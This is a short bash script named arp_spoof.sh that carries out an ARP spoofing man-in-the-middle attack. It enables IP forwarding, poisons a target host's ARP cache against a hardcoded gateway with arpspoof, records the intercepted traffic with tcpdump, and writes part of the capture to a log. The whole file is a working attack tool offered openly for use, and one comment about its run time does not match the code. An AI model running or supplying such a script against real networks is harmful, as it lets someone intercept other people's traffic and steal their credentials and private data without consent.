#!/bin/bash

# arp_spoof.sh
TARGET_IP=$1
LOG_FILE="/home/rb/arp_attack_logs.txt"
GATEWAY_IP="172.30.112.1"  # Adjust to your network

# Function to log messages
log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a $LOG_FILE
}

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    log_message "Please run as root"
    exit 1
fi

# Check if target IP is provided
if [ -z "$TARGET_IP" ]; then
    log_message "Usage: $0 <target_ip>"
    exit 1
fi

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
log_message "Enabled IP forwarding"

# Start ARP spoofing
log_message "Starting ARP spoofing attack against $TARGET_IP"
timeout 60 arpspoof -i eth0 -t $TARGET_IP $GATEWAY_IP &
SPOOF_PID=$!

# Monitor and log traffic
log_message "Starting traffic monitoring"
tcpdump -i eth0 -w /tmp/captured_traffic.pcap &
TCPDUMP_PID=$!

# Run for 5 minutes
sleep 60

# Cleanup
kill $SPOOF_PID
kill $TCPDUMP_PID
echo 0 > /proc/sys/net/ipv4/ip_forward

# Analyze results
log_message "Attack completed. Analyzing captured traffic..."
tcpdump -r /tmp/captured_traffic.pcap | head -n 10 >> $LOG_FILE

# Cleanup captured file
rm /tmp/captured_traffic.pcap

log_message "ARP spoofing attack completed"